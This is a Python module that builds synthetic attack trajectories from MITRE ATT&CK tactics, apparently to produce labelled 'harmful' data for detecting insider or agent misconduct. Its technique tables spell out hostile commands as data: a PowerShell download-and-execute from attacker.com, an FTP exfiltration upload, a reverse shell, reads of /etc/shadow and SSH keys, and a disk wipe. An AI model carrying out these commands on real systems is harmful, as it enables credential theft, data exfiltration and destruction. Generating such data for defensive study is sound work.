"""Compositional trajectory generation using MITRE ATT&CK tactics.

Instead of fixed templates, this module composes attack chains by:
1. Selecting a sequence of tactics (e.g., recon -> credential_access -> exfil)
2. Choosing specific techniques for each tactic
3. Generating realistic observations and intents
4. Tracking state evolution across steps

Now covers 12 of 14 MITRE ATT&CK Enterprise tactics.
"""

import random
from typing import Any
from dataclasses import dataclass, field


# =============================================================================
# STATE EVOLUTION TRACKING
# =============================================================================

@dataclass
class TrajectoryState:
    """Tracks evolving state across trajectory steps."""
    # What the attacker has discovered/obtained
    discovered_hosts: list[str] = field(default_factory=list)
    harvested_credentials: list[str] = field(default_factory=list)
    accessed_files: list[str] = field(default_factory=list)
    compromised_systems: list[str] = field(default_factory=list)

    # Current position in attack
    current_host: str = "initial-host"
    privilege_level: str = "user"  # user -> admin -> root

    # Data collected for exfil
    staged_data: list[str] = field(default_factory=list)
    data_volume_mb: int = 0

    # Persistence mechanisms
    persistence_methods: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "discovered_hosts": self.discovered_hosts.copy(),
            "harvested_credentials": self.harvested_credentials.copy(),
            "accessed_files": self.accessed_files.copy(),
            "compromised_systems": self.compromised_systems.copy(),
            "current_host": self.current_host,
            "privilege_level": self.privilege_level,
            "staged_data": self.staged_data.copy(),
            "data_volume_mb": self.data_volume_mb,
            "persistence_methods": self.persistence_methods.copy(),
        }


def evolve_state(state: TrajectoryState, action: dict, technique: dict) -> dict:
    """Evolve trajectory state based on action taken.

    Returns a dict of state changes for the step.
    """
    action_name = action.get("name", "")
    args = action.get("args", [])
    changes = {}

    # File access tracking
    if action_name == "READ_FILE" and args:
        filepath = args[0]
        if filepath not in state.accessed_files:
            state.accessed_files.append(filepath)
            changes["file_accessed"] = filepath

        # Check for credential discovery
        cred_files = ["/etc/shadow", ".ssh/id_rsa", ".env", "credentials", "secrets", "password"]
        if any(cf in filepath.lower() for cf in cred_files):
            cred_type = "ssh_key" if "ssh" in filepath else "password_hash" if "shadow" in filepath else "api_key"
            state.harvested_credentials.append(f"{cred_type}:{filepath}")
            changes["credential_harvested"] = cred_type

    # Network discovery
    if action_name in ["PORT_SCAN", "SCAN_NETWORK"]:
        # Simulate discovering hosts
        discovered = random.sample(
            ["db-server", "web-server", "admin-ws", "backup-server", "mail-server"],
            k=random.randint(1, 3)
        )
        for host in discovered:
            if host not in state.discovered_hosts:
                state.discovered_hosts.append(host)
        changes["hosts_discovered"] = discovered

    # Lateral movement
    if action_name in ["SSH_TO", "RDP_TO"]:
        target = args[0] if args else "unknown-host"
        state.current_host = target
        if target not in state.compromised_systems:
            state.compromised_systems.append(target)
        changes["moved_to"] = target

    # Privilege escalation
    if action_name == "SUDO" or "privesc" in str(technique.get("intent_templates", [])).lower():
        if state.privilege_level == "user":
            state.privilege_level = "admin"
        elif state.privilege_level == "admin":
            state.privilege_level = "root"
        changes["privilege_escalated"] = state.privilege_level

    # Data collection
    if action_name == "QUERY_DB":
        query = args[0] if args else ""
        if "users" in query.lower() or "*" in query:
            state.staged_data.append("user_records")
            state.data_volume_mb += random.randint(10, 100)
            changes["data_staged"] = "user_records"

    if action_name == "COMPRESS":
        changes["data_compressed"] = True

    # Persistence
    if action_name in ["CRON_ADD", "ADD_SSH_KEY", "CREATE_USER", "SCHEDULED_TASK"]:
        method = action_name.lower().replace("_", "-")
        state.persistence_methods.append(method)
        changes["persistence_added"] = method

    # Exfiltration
    if action_name in ["EXFIL", "UPLOAD"]:
        changes["exfiltration_attempted"] = True
        changes["data_volume_mb"] = state.data_volume_mb

    return changes


# =============================================================================
# MITRE ATT&CK TACTIC DEFINITIONS
# Each tactic contains multiple techniques (action + context)
# =============================================================================

TACTICS = {
    "reconnaissance": {
        "description": "Gathering information about the target",
        "techniques": [
            {
                "action": {"name": "LIST_USERS", "args": []},
                "obs_templates": [
                    "Starting to enumerate the environment",
                    "Need to understand user landscape",
                    "Beginning target reconnaissance",
                ],
                "intent_templates": [
                    "enumerate user accounts",
                    "list all users on system",
                    "discover user identities",
                ],
                "flags": {},
            },
            {
                "action": {"name": "LIST_PROCESSES", "args": []},
                "obs_templates": [
                    "Checking what services are running",
                    "Need to find vulnerable processes",
                    "Scanning for interesting services",
                ],
                "intent_templates": [
                    "enumerate running processes",
                    "find potential targets",
                    "identify services",
                ],
                "flags": {},
            },
            {
                "action": {"name": "PORT_SCAN", "args": ["192.168.1.0/24"]},
                "obs_templates": [
                    "Looking for network targets",
                    "Need to map internal network",
                    "Scanning for open services",
                ],
                "intent_templates": [
                    "scan network for targets",
                    "discover open ports",
                    "map network topology",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/passwd"]},
                "obs_templates": [
                    "Checking system user accounts",
                    "Need to enumerate local users",
                ],
                "intent_templates": [
                    "read passwd file for users",
                    "enumerate system accounts",
                ],
                "flags": {},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/hosts"]},
                "obs_templates": [
                    "Looking for internal hostnames",
                    "Checking network configuration",
                ],
                "intent_templates": [
                    "discover internal hosts",
                    "map hostname entries",
                ],
                "flags": {},
            },
        ],
    },
    "credential_access": {
        "description": "Stealing credentials for lateral movement",
        "techniques": [
            {
                "action": {"name": "READ_FILE", "args": ["/etc/shadow"]},
                "obs_templates": [
                    "Found shadow file accessible",
                    "Attempting to access password hashes",
                    "Targeting credential storage",
                ],
                "intent_templates": [
                    "steal password hashes",
                    "access shadow file",
                    "extract credentials",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/home/user/.ssh/id_rsa"]},
                "obs_templates": [
                    "Found SSH keys in user directory",
                    "User has SSH private key stored",
                ],
                "intent_templates": [
                    "steal SSH private key",
                    "extract SSH credentials",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/app/.env"]},
                "obs_templates": [
                    "Application has environment file",
                    "Found .env with potential secrets",
                ],
                "intent_templates": [
                    "extract environment secrets",
                    "read application credentials",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "ENV_READ", "args": ["AWS_SECRET_ACCESS_KEY"]},
                "obs_templates": [
                    "Cloud credentials may be in environment",
                    "Checking for AWS secrets",
                ],
                "intent_templates": [
                    "steal AWS credentials",
                    "extract cloud secrets",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "DUMP_MEMORY", "args": ["web-server"]},
                "obs_templates": [
                    "Process may have cached credentials",
                    "Memory contains session tokens",
                ],
                "intent_templates": [
                    "dump process memory",
                    "extract cached credentials",
                ],
                "flags": {"sensitive_access": True, "policy_violation": True},
            },
            {
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM users"]},
                "obs_templates": [
                    "Database contains user credentials",
                    "Found users table with passwords",
                ],
                "intent_templates": [
                    "dump user database",
                    "extract stored credentials",
                ],
                "flags": {"sensitive_access": True},
            },
        ],
    },
    "privilege_escalation": {
        "description": "Gaining higher privileges on the system",
        "techniques": [
            {
                "action": {"name": "SUDO", "args": ["cat /etc/shadow"]},
                "obs_templates": [
                    "Found sudo misconfiguration",
                    "User has excessive sudo rights",
                ],
                "intent_templates": [
                    "escalate to root via sudo",
                    "abuse sudo privileges",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "CHMOD", "args": ["/usr/local/bin/exploit", "4755"]},
                "obs_templates": [
                    "Found binary to make SUID",
                    "Can modify binary permissions",
                ],
                "intent_templates": [
                    "set SUID bit for escalation",
                    "modify permissions for privesc",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "READ_FILE", "args": ["/etc/sudoers"]},
                "obs_templates": [
                    "Checking sudo configuration",
                    "Looking for sudo misconfigurations",
                ],
                "intent_templates": [
                    "read sudoers for escalation vectors",
                    "find sudo vulnerabilities",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "lateral_movement": {
        "description": "Moving to other systems in the network",
        "techniques": [
            {
                "action": {"name": "SSH_TO", "args": ["db-server.internal"]},
                "obs_templates": [
                    "Have valid SSH key for target",
                    "Database server accessible via SSH",
                ],
                "intent_templates": [
                    "pivot to database server",
                    "move laterally via SSH",
                ],
                "flags": {"lateral_movement": True},
            },
            {
                "action": {"name": "SSH_TO", "args": ["web-server.internal"]},
                "obs_templates": [
                    "Web server in reachable network segment",
                    "Can access web server with stolen key",
                ],
                "intent_templates": [
                    "pivot to web server",
                    "lateral movement to web tier",
                ],
                "flags": {"lateral_movement": True},
            },
            {
                "action": {"name": "RDP_TO", "args": ["admin-workstation.corp"]},
                "obs_templates": [
                    "Admin workstation has RDP enabled",
                    "Have credentials for admin desktop",
                ],
                "intent_templates": [
                    "connect to admin workstation",
                    "access Windows desktop via RDP",
                ],
                "flags": {"lateral_movement": True},
            },
        ],
    },
    "persistence": {
        "description": "Maintaining access after reboot",
        "techniques": [
            {
                "action": {"name": "CRON_ADD", "args": ["*/5 * * * * /tmp/beacon.sh"]},
                "obs_templates": [
                    "Need persistent callback mechanism",
                    "Installing persistence via cron",
                ],
                "intent_templates": [
                    "add cron job for persistence",
                    "schedule persistent callback",
                ],
                "flags": {"persistence": True},
            },
            {
                "action": {"name": "ADD_SSH_KEY", "args": ["ssh-rsa AAAA...attacker..."]},
                "obs_templates": [
                    "Can modify authorized_keys",
                    "Adding backdoor SSH access",
                ],
                "intent_templates": [
                    "add SSH key for persistent access",
                    "install SSH backdoor",
                ],
                "flags": {"persistence": True},
            },
            {
                "action": {"name": "CREATE_USER", "args": ["backdoor"]},
                "obs_templates": [
                    "Creating hidden admin account",
                    "Adding backdoor user for persistence",
                ],
                "intent_templates": [
                    "create backdoor user account",
                    "add persistent admin user",
                ],
                "flags": {"persistence": True, "policy_violation": True},
            },
        ],
    },
    "collection": {
        "description": "Gathering data for exfiltration",
        "techniques": [
            {
                "action": {"name": "READ_FILE", "args": ["/app/config/secrets.yaml"]},
                "obs_templates": [
                    "Found application secrets file",
                    "Secrets stored in config directory",
                ],
                "intent_templates": [
                    "collect application secrets",
                    "gather sensitive configuration",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "QUERY_DB", "args": ["SELECT * FROM customers"]},
                "obs_templates": [
                    "Customer data available in database",
                    "Found valuable PII in customers table",
                ],
                "intent_templates": [
                    "extract customer records",
                    "dump customer database",
                ],
                "flags": {"sensitive_access": True},
            },
            {
                "action": {"name": "COMPRESS", "args": ["/tmp/collected_data/"]},
                "obs_templates": [
                    "Data collected, preparing for transfer",
                    "Staging data for exfiltration",
                ],
                "intent_templates": [
                    "compress collected data",
                    "archive for exfiltration",
                ],
                "flags": {},
            },
        ],
    },
    "exfiltration": {
        "description": "Stealing data from the target",
        "techniques": [
            {
                "action": {"name": "EXFIL", "args": ["customer_data.tar.gz"]},
                "obs_templates": [
                    "Data ready for transfer",
                    "Initiating data exfiltration",
                ],
                "intent_templates": [
                    "exfiltrate collected data",
                    "transfer stolen data",
                ],
                "flags": {"exfil_attempt": True},
            },
            {
                "action": {"name": "UPLOAD", "args": ["ftp://attacker.com/dump.tar"]},
                "obs_templates": [
                    "Uploading to external server",
                    "Transferring data to C2",
                ],
                "intent_templates": [
                    "upload data to external server",
                    "exfil via FTP",
                ],
                "flags": {"exfil_attempt": True},
            },
        ],
    },
    "defense_evasion": {
        "description": "Avoiding detection",
        "techniques": [
            {
                "action": {"name": "DELETE_LOGS", "args": []},
                "obs_templates": [
                    "Need to remove evidence",
                    "Covering tracks in logs",
                ],
                "intent_templates": [
                    "delete application logs",
                    "remove evidence of activity",
                ],
                "flags": {"log_tamper": True},
            },
            {
                "action": {"name": "HISTORY_CLEAR", "args": []},
                "obs_templates": [
                    "Clearing command history",
                    "Removing shell history",
                ],
                "intent_templates": [
                    "clear bash history",
                    "remove command traces",
                ],
                "flags": {"log_tamper": True},
            },
            {
                "action": {"name": "DISABLE_LOGGING", "args": []},
                "obs_templates": [
                    "Stopping audit logging",
                    "Disabling security monitoring",
                ],
                "intent_templates": [
                    "disable system logging",
                    "stop audit trail",
                ],
                "flags": {"log_tamper": True},
            },
            {
                "action": {"name": "TIMESTOMP", "args": ["/var/log/"]},
                "obs_templates": [
                    "Modifying file timestamps",
                    "Covering tracks with timestomp",
                ],
                "intent_templates": [
                    "modify file timestamps",
                    "hide modification times",
                ],
                "flags": {"log_tamper": True},
            },
        ],
    },
    # =========================================================================
    # NEW TACTICS: Full MITRE ATT&CK coverage
    # =========================================================================
    "initial_access": {
        "description": "How attackers gain initial entry",
        "techniques": [
            {
                "action": {"name": "PHISH_CLICK", "args": ["malicious_link.exe"]},
                "obs_templates": [
                    "User clicked phishing link in email",
                    "Malicious attachment executed by user",
                    "Drive-by download completed",
                ],
                "intent_templates": [
                    "gain initial foothold via phishing",
                    "establish access through social engineering",
                    "execute initial payload",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "EXPLOIT_CVE", "args": ["CVE-2024-1234"]},
                "obs_templates": [
                    "Found vulnerable service version",
                    "Unpatched system detected",
                    "Exploitable vulnerability confirmed",
                ],
                "intent_templates": [
                    "exploit vulnerability for access",
                    "gain access via unpatched CVE",
                    "compromise vulnerable service",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "SUPPLY_CHAIN", "args": ["compromised_package"]},
                "obs_templates": [
                    "Malicious dependency installed",
                    "Compromised package in use",
                    "Supply chain attack successful",
                ],
                "intent_templates": [
                    "leverage supply chain compromise",
                    "execute via malicious dependency",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "VALID_ACCOUNTS", "args": ["stolen_creds"]},
                "obs_templates": [
                    "Using stolen credentials from breach",
                    "Credentials from credential stuffing",
                    "Reusing leaked passwords",
                ],
                "intent_templates": [
                    "access with compromised credentials",
                    "login with stolen account",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "execution": {
        "description": "Running malicious code",
        "techniques": [
            {
                "action": {"name": "RUN_SCRIPT", "args": ["malware.py"]},
                "obs_templates": [
                    "Executing payload script",
                    "Running malicious code",
                    "Script execution initiated",
                ],
                "intent_templates": [
                    "execute malicious payload",
                    "run attack script",
                    "launch malware",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "POWERSHELL", "args": ["IEX(wget attacker.com/shell.ps1)"]},
                "obs_templates": [
                    "PowerShell execution available",
                    "Can run arbitrary commands",
                    "Shell access obtained",
                ],
                "intent_templates": [
                    "execute PowerShell payload",
                    "run encoded command",
                    "download and execute",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "SCHEDULED_TASK", "args": ["malicious_task"]},
                "obs_templates": [
                    "Can create scheduled tasks",
                    "Task scheduler accessible",
                ],
                "intent_templates": [
                    "schedule malicious execution",
                    "create persistent task",
                ],
                "flags": {"policy_violation": True, "persistence": True},
            },
            {
                "action": {"name": "CONTAINER_EXEC", "args": ["docker exec -it web sh"]},
                "obs_templates": [
                    "Container escape possible",
                    "Can execute in container",
                ],
                "intent_templates": [
                    "execute in container",
                    "escape container boundaries",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "command_and_control": {
        "description": "Maintaining communication with compromised systems",
        "techniques": [
            {
                "action": {"name": "BEACON", "args": ["c2.attacker.com"]},
                "obs_templates": [
                    "Establishing C2 channel",
                    "Connecting to command server",
                    "Beacon connection initiated",
                ],
                "intent_templates": [
                    "establish C2 communication",
                    "connect to command server",
                    "start beacon callback",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "DNS_TUNNEL", "args": ["data.evil.com"]},
                "obs_templates": [
                    "Using DNS for covert channel",
                    "DNS tunneling available",
                    "Exfiltrating via DNS queries",
                ],
                "intent_templates": [
                    "exfiltrate via DNS",
                    "establish covert DNS channel",
                ],
                "flags": {"exfil_attempt": True},
            },
            {
                "action": {"name": "REVERSE_SHELL", "args": ["attacker:4444"]},
                "obs_templates": [
                    "Opening reverse shell",
                    "Connecting back to attacker",
                    "Establishing interactive access",
                ],
                "intent_templates": [
                    "establish reverse shell",
                    "get interactive access",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "HTTPS_C2", "args": ["legitimate-looking.com"]},
                "obs_templates": [
                    "C2 over HTTPS to blend in",
                    "Using encrypted C2 channel",
                ],
                "intent_templates": [
                    "establish encrypted C2",
                    "hide C2 in HTTPS traffic",
                ],
                "flags": {"policy_violation": True},
            },
        ],
    },
    "impact": {
        "description": "Disrupting availability or integrity",
        "techniques": [
            {
                "action": {"name": "ENCRYPT_FILES", "args": ["/data/*"]},
                "obs_templates": [
                    "Deploying ransomware",
                    "Encrypting target files",
                    "Starting encryption routine",
                ],
                "intent_templates": [
                    "encrypt files for ransom",
                    "deploy ransomware payload",
                    "lock data for extortion",
                ],
                "flags": {"policy_violation": True, "log_tamper": True},
            },
            {
                "action": {"name": "WIPE_DISK", "args": ["/dev/sda"]},
                "obs_templates": [
                    "Initiating disk wipe",
                    "Destroying data permanently",
                    "Executing wiper malware",
                ],
                "intent_templates": [
                    "destroy all data",
                    "wipe system disk",
                    "cause maximum damage",
                ],
                "flags": {"policy_violation": True, "log_tamper": True},
            },
            {
                "action": {"name": "DEFACE", "args": ["index.html"]},
                "obs_templates": [
                    "Modifying public website",
                    "Defacing web content",
                ],
                "intent_templates": [
                    "deface website",
                    "leave calling card",
                ],
                "flags": {"policy_violation": True},
            },
            {
                "action": {"name": "DATA_MANIPULATION", "args": ["financial_records"]},
                "obs_templates": [
                    "Modifying critical data",
                    "Tampering with records",
                ],
                "intent_templates": [
                    "corrupt financial data",
                    "manipulate records",
                ],
                "flags": {"policy_violation": True, "sensitive_access": True},
            },
        ],
    },
    "discovery": {
        "description": "Learning about the environment (expanded)",
        "techniques": [
            {
                "action": {"name": "AD_ENUM", "args": []},
                "obs_templates": [
                    "Running Active Directory enumeration",
                    "Mapping AD attack paths",
                    "Collecting AD relationships",
                ],
                "intent_templates": [
                    "map Active Directory",
                    "find privilege escalation paths",
                    "enumerate domain",
                ],
                "flags": {},
            },
            {
                "action": {"name": "CLOUD_ENUM", "args": ["aws"]},
                "obs_templates": [
                    "Enumerating cloud resources",
                    "Discovering cloud assets",
                    "Mapping cloud infrastructure",
                ],
                "intent_templates": [
                    "enumerate cloud resources",
                    "discover cloud assets",
                    "map cloud attack surface",
                ],
                "flags": {},
            },
            {
                "action": {"name": "CONTAINER_ENUM", "args": []},
                "obs_templates": [
                    "Enumerating containers",
                    "Discovering Kubernetes pods",
                    "Mapping container infrastructure",
                ],
                "intent_templates": [
                    "enumerate containers",
                    "find container escape vectors",
                    "map k8s cluster",
                ],
                "flags": {},
            },
            {
                "action": {"name": "NETWORK_SHARE_ENUM", "args": []},
                "obs_templates": [
                    "Enumerating network shares",
                    "Finding accessible file shares",
                ],
                "intent_templates": [
                    "discover network shares",
                    "find accessible data stores",
                ],
                "flags": {},
            },
        ],
    },
}


# =============================================================================
# ATTACK CHAIN DEFINITIONS
# Common sequences of tactics for different attack types
# =============================================================================

ATTACK_CHAINS = {
    "data_theft": {
        "description": "Classic data exfiltration attack",
        "tactics": ["reconnaissance", "credential_access", "collection", "exfiltration"],
        "outcome": "harmful",
    },
    "apt_full": {
        "description": "Full APT-style attack with persistence",
        "tactics": ["reconnaissance", "credential_access", "privilege_escalation",
                   "persistence", "lateral_movement", "collection", "exfiltration",
                   "defense_evasion"],
        "outcome": "harmful",
    },
    "smash_and_grab": {
        "description": "Quick data theft without persistence",
        "tactics": ["credential_access", "collection", "exfiltration"],
        "outcome": "harmful",
    },
    "lateral_spread": {
        "description": "Focus on spreading through network",
        "tactics": ["reconnaissance", "credential_access", "lateral_movement",
                   "credential_access", "lateral_movement"],
        "outcome": "harmful",
    },
    "persistent_access": {
        "description": "Establish long-term access",
        "tactics": ["credential_access", "privilege_escalation", "persistence",
                   "defense_evasion"],
        "outcome": "harmful",
    },
    "credential_harvest": {
        "description": "Focus on stealing credentials",
        "tactics": ["reconnaissance", "credential_access", "credential_access",
                   "exfiltration"],
        "outcome": "harmful",
    },
    "cover_tracks": {
        "description": "Post-attack cleanup",
        "tactics": ["defense_evasion", "defense_evasion"],
        "outcome": "harmful",
    },
    # =========================================================================
    # NEW ATTACK CHAINS: Using new tactics
    # =========================================================================
    "ransomware": {
        "description": "Ransomware deployment attack",
        "tactics": ["initial_access", "execution", "privilege_escalation",
                   "defense_evasion", "impact"],
        "outcome": "harmful",
    },
    "supply_chain_attack": {
        "description": "Attack via compromised supply chain",
        "tactics": ["initial_access", "execution", "persistence",
                   "collection", "exfiltration"],
        "outcome": "harmful",
    },
    "c2_establishment": {
        "description": "Establishing command and control",
        "tactics": ["initial_access", "execution", "command_and_control",
                   "persistence", "discovery"],
        "outcome": "harmful",
    },
    "destructive_attack": {
        "description": "Wiper/destructive malware attack",
        "tactics": ["initial_access", "privilege_escalation", "defense_evasion",
                   "impact"],
        "outcome": "harmful",
    },
    "cloud_compromise": {
        "description": "Cloud infrastructure compromise",
        "tactics": ["initial_access", "discovery", "credential_access",
                   "collection", "exfiltration"],
        "outcome": "harmful",
    },
    "insider_sabotage": {
        "description": "Insider threat with destructive intent",
        "tactics": ["credential_access", "privilege_escalation",
                   "defense_evasion", "impact"],
        "outcome": "harmful",
    },
    "stealth_exfil": {
        "description": "Low and slow data exfiltration",
        "tactics": ["reconnaissance", "credential_access", "collection",
                   "command_and_control", "exfiltration", "defense_evasion"],
        "outcome": "harmful",
    },
    "privilege_chain": {
        "description": "Privilege escalation focused attack",
        "tactics": ["initial_access", "discovery", "privilege_escalation",
                   "privilege_escalation", "persistence"],
        "outcome": "harmful",
    },
}


# =============================================================================
# COMPOSITION ENGINE
# =============================================================================

def select_technique(tactic_name: str, used_actions: set[str]) -> dict[str, Any] | None:
    """Select a random technique from a tactic, avoiding duplicates."""
    tactic = TACTICS.get(tactic_name)
    if not tactic:
        return None

    available = [t for t in tactic["techniques"]
                 if t["action"]["name"] not in used_actions]

    if not available:
        # Allow duplicates if we've exhausted unique options
        available = tactic["techniques"]

    return random.choice(available)


def generate_step(technique: dict[str, Any], step_id: int) -> dict[str, Any]:
    """Generate a trajectory step from a technique."""
    obs = random.choice(technique["obs_templates"])
    intent = random.choice(technique["intent_templates"])

    return {
        "step_id": step_id,
        "obs": obs,
        "intent": intent,
        "action": technique["action"],
        "state_change": {
            "files": {},
            "network": {},
            "credentials": {},
            "flags": technique["flags"],
        },
    }


def compose_trajectory(
    chain_name: str,
    episode_id: str,
    track_state: bool = True,
) -> dict[str, Any]:
    """Compose a trajectory from an attack chain definition.

    Args:
        chain_name: Name of the attack chain to use
        episode_id: Unique identifier for this episode
        track_state: Whether to track and include state evolution

    Returns:
        Complete trajectory dictionary with optional state evolution
    """
    from sandbox.env import base_initial_state

    chain = ATTACK_CHAINS.get(chain_name)
    if not chain:
        raise ValueError(f"Unknown attack chain: {chain_name}")

    agent_type = "insider"  # Composed attacks are insider threats
    initial_state = base_initial_state(agent_type)

    trajectory = []
    used_actions: set[str] = set()
    step_id = 0

    # Initialize state tracking
    state = TrajectoryState() if track_state else None

    for tactic_name in chain["tactics"]:
        technique = select_technique(tactic_name, used_actions)
        if technique:
            step = generate_step(technique, step_id)

            # Track state evolution
            if state:
                state_changes = evolve_state(state, technique["action"], technique)
                step["state_change"]["evolution"] = state_changes

            trajectory.append(step)
            used_actions.add(technique["action"]["name"])
            step_id += 1

    result = {
        "episode_id": episode_id,
        "agent_type": agent_type,
        "initial_state": {
            "files": initial_state.files,
            "network": {
                "ports": initial_state.network.ports,
                "outbound_allowed": initial_state.network.outbound_allowed,
            },
            "credentials": initial_state.credentials,
            "user_context": {
                "role": initial_state.user_context.role,
                "privilege_level": initial_state.user_context.privilege_level,
            },
        },
        "trajectory": trajectory,
        "outcome": chain["outcome"],
        "notes": f"Composed from {chain_name} chain",
    }

    # Include final state snapshot
    if state:
        result["final_state"] = state.to_dict()

    return result


def generate_composed_dataset(n: int, output_path: str) -> dict[str, int]:
    """Generate n composed trajectories from attack chains."""
    import json

    stats = {"total": 0, "chains": {}}
    chain_names = list(ATTACK_CHAINS.keys())

    with open(output_path, "w") as f:
        for i in range(n):
            chain_name = random.choice(chain_names)
            episode_id = f"composed_{chain_name}_{i:05d}"
            episode = compose_trajectory(chain_name, episode_id)

            f.write(json.dumps(episode) + "\n")

            stats["total"] += 1
            stats["chains"][chain_name] = stats["chains"].get(chain_name, 0) + 1

    return stats


if __name__ == "__main__":
    # Test composition
    stats = generate_composed_dataset(100, "data/composed_trajectories.jsonl")
    print(f"Generated: {stats}")
